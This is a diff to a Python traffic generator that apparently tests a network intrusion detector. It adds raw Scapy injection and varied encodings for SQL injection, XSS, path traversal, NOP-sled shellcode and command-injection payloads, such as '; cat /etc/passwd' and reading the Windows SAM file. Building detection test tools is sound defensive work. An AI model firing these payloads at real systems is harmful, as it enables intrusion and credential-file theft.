@@ -44,16 +44,17 @@ from itertools import cycle
 from pathlib import Path
 import urllib.request
 import urllib.error
+import urllib.parse
 
 # ------------------------------------------------------------------ #
 #  SCAPY IMPORT                                                        #
 # ------------------------------------------------------------------ #
 try:
-    from scapy.all import IP, TCP, UDP, ICMP, send, RandShort
+    from scapy.all import IP, TCP, UDP, ICMP, Raw, send, RandShort
     SCAPY_OK = True
 except ImportError:
     SCAPY_OK = False
-    IP = TCP = UDP = ICMP = send = RandShort = None
+    IP = TCP = UDP = ICMP = Raw = send = RandShort = None
 
 # ------------------------------------------------------------------ #
 #  DEFAULTS                                                            #
@@ -120,11 +121,11 @@ RULES = {
     "elastic":    ("Elasticsearch Attack",  ["ELASTICSEARCH", "ELASTIC"],                  20,   "Elasticsearch attack (port 9200)"),
     "ddos":       ("DDoS Multi-Source",     ["DDOS", "MULTI-SOURCE", "UNIQUE IPS",
                                              "UNIQUE SOURCE"],                            600,   "DDoS from 30 spoofed sources"),
-    "sqli":       ("SQL Injection Attack",  ["SQL INJECTION", "SQLI", "Payload Attack"], 10,   "HTTP GET/POST with SQL injection payload"),
-    "xss":        ("XSS Attack",            ["XSS", "CROSS-SITE SCRIPTING", "Payload Attack"], 10,   "HTTP GET/POST with XSS payload"),
-    "shellcode":  ("Shellcode Injection",   ["Shellcode", "SHELL CODE", "Payload Attack"],      10,   "HTTP POST with NOP sled + shellcode"),
-    "path_trav":  ("Path Traversal Attack", ["PATH TRAVERSAL", "DIRECTORY TRAVERSAL", "Payload Attack"], 10,   "HTTP GET with path traversal payload"),
-    "rce":        ("Remote Code Execution", ["RCE", "REMOTE CODE EXECUTION", "Payload Attack"], 10,   "HTTP POST with command injection"),
+    "sqli":       ("SQL Injection Attack",  ["SQL INJECTION", "SQLI", "PAYLOAD SIGNATURE", "PAYLOAD ATTACK"], 10,   "HTTP GET/POST with SQL injection payload"),
+    "xss":        ("XSS Attack",            ["XSS", "CROSS-SITE SCRIPTING", "PAYLOAD SIGNATURE", "PAYLOAD ATTACK"], 10,   "HTTP GET/POST with XSS payload"),
+    "shellcode":  ("Shellcode Injection",   ["SHELLCODE", "SHELL CODE", "PAYLOAD SIGNATURE", "PAYLOAD ATTACK"],      10,   "HTTP POST with NOP sled + shellcode"),
+    "path_trav":  ("Path Traversal Attack", ["PATH TRAVERSAL", "DIRECTORY TRAVERSAL", "PAYLOAD SIGNATURE", "PAYLOAD ATTACK"], 10,   "HTTP GET with path traversal payload"),
+    "rce":        ("Remote Code Execution", ["RCE", "REMOTE CODE EXECUTION", "PAYLOAD SIGNATURE", "PAYLOAD ATTACK"], 10,   "HTTP POST with command injection"),
     "normal":     ("Normal Traffic",        ["NORMAL TRAFFIC"],                            50,   "Benign traffic (HTTP/HTTPS/DNS/SSH) — should NOT trigger alerts"),
 }
 
@@ -710,35 +711,80 @@ def attack_elastic(target, duration, rate, stop_evt):
     )
 
 
-def send_http_payload(target, port, payload, method="GET", path="/", stop_evt=None):
+def send_http_payload(target, port, payload, method="GET", path="/", stop_evt=None,
+                      content_type="application/x-www-form-urlencoded",
+                      query_encode=False):
     """
     Send HTTP request with malicious payload (cross-platform).
     Works with raw sockets or urllib for maximum compatibility.
     """
     sent = 0
+
+    payload_bytes = payload if isinstance(payload, (bytes, bytearray)) else str(payload).encode("utf-8", errors="ignore")
+    payload_text = payload_bytes.decode("latin-1", errors="ignore")
+
+    # Preferred path: Scapy raw packet injection guarantees payload bytes on wire.
+    if SCAPY_OK:
+        try:
+            if method.upper() == "GET":
+                query_value = urllib.parse.quote_plus(payload_text) if query_encode else payload_text
+                req_bytes = (
+                    f"GET {path}?{query_value} HTTP/1.1\r\n"
+                    f"Host: {target}\r\n"
+                    f"User-Agent: NIDS-Simulator\r\n"
+                    "Connection: close\r\n\r\n"
+                ).encode("latin-1", errors="ignore")
+            else:
+                headers = (
+                    f"POST {path} HTTP/1.1\r\n"
+                    f"Host: {target}\r\n"
+                    "User-Agent: NIDS-Simulator\r\n"
+                    f"Content-Type: {content_type}\r\n"
+                    f"Content-Length: {len(payload_bytes)}\r\n"
+                    "Connection: close\r\n\r\n"
+                ).encode("ascii", errors="ignore")
+                req_bytes = headers + payload_bytes
+
+            pkt = IP(dst=target) / TCP(
+                sport=RandShort(),
+                dport=port,
+                flags="PA",
+                seq=random.randint(0, 2**32 - 1),
+                ack=random.randint(0, 2**32 - 1),
+            ) / Raw(load=req_bytes)
+            send(pkt, verbose=False)
+            return 1
+        except Exception:
+            pass
+
+    # Fallback path when Scapy is unavailable.
     try:
-        if method == "GET":
-            url = f"http://{target}:{port}{path}?{payload}"
+        if method.upper() == "GET":
+            query_value = urllib.parse.quote_plus(payload_text) if query_encode else payload_text
+            url = f"http://{target}:{port}{path}?{query_value}"
+            body = None
         else:
             url = f"http://{target}:{port}{path}"
-        
+            body = payload_bytes
+
         req = urllib.request.Request(
             url,
-            data=payload.encode() if method == "POST" else None,
-            headers={"Content-Type": "application/x-www-form-urlencoded"}
+            data=body,
+            headers={"Content-Type": content_type}
         )
         try:
             urllib.request.urlopen(req, timeout=1)
-            sent = 1
         except (urllib.error.URLError, urllib.error.HTTPError, Exception):
-            sent = 1  # Count as sent even if target doesn't respond
+            # Count attempted send even if endpoint refuses connection.
+            pass
+        sent = 1
     except Exception:
         pass
     return sent
 
 
 def attack_sqli(target, duration, rate, stop_evt):
-    """SQL Injection Attack — HTTP GET/POST with SQLi payload"""
+    """SQL Injection Attack — plain + URL-encoded + JSON formats"""
     sql_payloads = [
         "user=admin' OR '1'='1",
         "id=1 UNION SELECT NULL,NULL--",
@@ -754,7 +800,21 @@ def attack_sqli(target, duration, rate, stop_evt):
     while time.time() < end and not stop_evt.is_set():
         try:
             payload = sql_payloads[idx % len(sql_payloads)]
-            send_http_payload(target, 80, payload, method="GET")
+            fmt = idx % 3
+            if fmt == 0:
+                send_http_payload(target, 80, payload, method="GET")
+            elif fmt == 1:
+                send_http_payload(target, 80, payload, method="GET", query_encode=True)
+            else:
+                json_payload = json.dumps({"input": payload, "username": "admin"}, ensure_ascii=True)
+                send_http_payload(
+                    target,
+                    80,
+                    json_payload,
+                    method="POST",
+                    path="/api/login",
+                    content_type="application/json",
+                )
             sent += 1
             idx += 1
             time.sleep(delay)
@@ -764,7 +824,7 @@ def attack_sqli(target, duration, rate, stop_evt):
 
 
 def attack_xss(target, duration, rate, stop_evt):
-    """XSS Attack — HTTP GET/POST with XSS payload"""
+    """XSS Attack — plain + URL-encoded + JSON formats"""
     xss_payloads = [
         "comment=<script>alert('XSS')</script>",
         "search=<img src=x onerror=alert('XSS')>",
@@ -780,7 +840,21 @@ def attack_xss(target, duration, rate, stop_evt):
     while time.time() < end and not stop_evt.is_set():
         try:
             payload = xss_payloads[idx % len(xss_payloads)]
-            send_http_payload(target, 80, payload, method="POST")
+            fmt = idx % 3
+            if fmt == 0:
+                send_http_payload(target, 80, payload, method="POST")
+            elif fmt == 1:
+                send_http_payload(target, 80, payload, method="GET", query_encode=True)
+            else:
+                json_payload = json.dumps({"comment": payload, "profile": "test"}, ensure_ascii=True)
+                send_http_payload(
+                    target,
+                    80,
+                    json_payload,
+                    method="POST",
+                    path="/api/comment",
+                    content_type="application/json",
+                )
             sent += 1
             idx += 1
             time.sleep(delay)
@@ -791,9 +865,9 @@ def attack_xss(target, duration, rate, stop_evt):
 
 def attack_shellcode(target, duration, rate, stop_evt):
     """Shellcode Injection — HTTP POST with NOP sled + shellcode pattern"""
-    # Simulate NOP sled (0x90 repeated 20 times) + shellcode marker
-    nop_sled = "\\x90" * 20
-    shellcode_marker = "\\x55\\x8b\\xec\\x51\\x52"  # Common x86 prologue
+    # Use true binary bytes so signature detector can match b"\x90" sled.
+    nop_sled = b"\x90" * 20
+    shellcode_marker = b"\x55\x8b\xec\x51\x52"  # Common x86 prologue
     
     end = time.time() + duration
     sent = 0
@@ -801,7 +875,7 @@ def attack_shellcode(target, duration, rate, stop_evt):
     
     while time.time() < end and not stop_evt.is_set():
         try:
-            payload = f"data={nop_sled}{shellcode_marker}&buffer_size=4096"
+            payload = b"data=" + nop_sled + shellcode_marker + b"&buffer_size=4096"
             send_http_payload(target, 80, payload, method="POST", path="/upload")
             sent += 1
             time.sleep(delay)
@@ -811,7 +885,7 @@ def attack_shellcode(target, duration, rate, stop_evt):
 
 
 def attack_path_trav(target, duration, rate, stop_evt):
-    """Path Traversal Attack — HTTP GET with directory traversal"""
+    """Path Traversal Attack — plain + URL-encoded + JSON formats"""
     trav_payloads = [
         "file=../../../etc/passwd",
         "path=..\\..\\..\\windows\\system32\\config\\sam",
@@ -827,7 +901,21 @@ def attack_path_trav(target, duration, rate, stop_evt):
     while time.time() < end and not stop_evt.is_set():
         try:
             payload = trav_payloads[idx % len(trav_payloads)]
-            send_http_payload(target, 80, payload, method="GET")
+            fmt = idx % 3
+            if fmt == 0:
+                send_http_payload(target, 80, payload, method="GET")
+            elif fmt == 1:
+                send_http_payload(target, 80, payload, method="GET", query_encode=True)
+            else:
+                json_payload = json.dumps({"file": payload, "mode": "read"}, ensure_ascii=True)
+                send_http_payload(
+                    target,
+                    80,
+                    json_payload,
+                    method="POST",
+                    path="/api/file",
+                    content_type="application/json",
+                )
             sent += 1
             idx += 1
             time.sleep(delay)
@@ -837,7 +925,7 @@ def attack_path_trav(target, duration, rate, stop_evt):
 
 
 def attack_rce(target, duration, rate, stop_evt):
-    """Remote Code Execution — HTTP POST with command injection"""
+    """Remote Code Execution — plain + URL-encoded + JSON formats"""
     rce_payloads = [
         "cmd=; cat /etc/passwd",
         "command=| whoami",
@@ -853,7 +941,21 @@ def attack_rce(target, duration, rate, stop_evt):
     while time.time() < end and not stop_evt.is_set():
         try:
             payload = rce_payloads[idx % len(rce_payloads)]
-            send_http_payload(target, 80, payload, method="POST", path="/execute")
+            fmt = idx % 3
+            if fmt == 0:
+                send_http_payload(target, 80, payload, method="POST", path="/execute")
+            elif fmt == 1:
+                send_http_payload(target, 80, payload, method="GET", path="/execute", query_encode=True)
+            else:
+                json_payload = json.dumps({"command": payload, "shell": "bash"}, ensure_ascii=True)
+                send_http_payload(
+                    target,
+                    80,
+                    json_payload,
+                    method="POST",
+                    path="/api/exec",
+                    content_type="application/json",
+                )
             sent += 1
             idx += 1
             time.sleep(delay)
